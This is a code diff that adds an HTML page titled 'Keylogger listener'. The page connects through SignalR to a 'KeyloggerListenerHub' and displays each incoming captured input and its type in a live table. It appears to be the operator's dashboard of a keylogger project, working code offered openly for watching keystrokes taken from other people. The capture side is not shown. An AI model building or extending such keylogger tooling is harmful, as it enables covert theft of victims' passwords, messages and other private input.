@@ -1,0 +1,38 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>Keylogger listener</title>
+    <script src="https://cdn.jsdelivr.net/npm/@aspnet/signalr-client@1.0.0-alpha2-final/dist/browser/signalr-client-1.0.0-alpha2-final.min.js"></script>   
+</head>
+<body>
+    <table>
+        <thead>
+            <tr>
+                <th>Type</th>
+                <th>Input</th>
+            </tr>
+        </thead>
+        <tbody id="tbody"></tbody>
+    </table>
+
+    <script>
+        let tbodyElement = document.getElementById("tbody");
+
+        let hub = new signalR.HubConnection("/hub/KeyloggerListenerHub");
+        hub.start();
+        hub.on("InputReceived", function (type, input) {
+            let typeElement = document.createElement("td");
+            typeElement.innerText = type;
+
+            let inputElement = document.createElement("td");
+            inputElement.innerText = input;
+
+            let rowElement = document.createElement("tr");
+            rowElement.appendChild(typeElement);
+            rowElement.appendChild(inputElement);
+
+            tbodyElement.appendChild(rowElement);
+        });
+    </script>
+</body>
+</html>
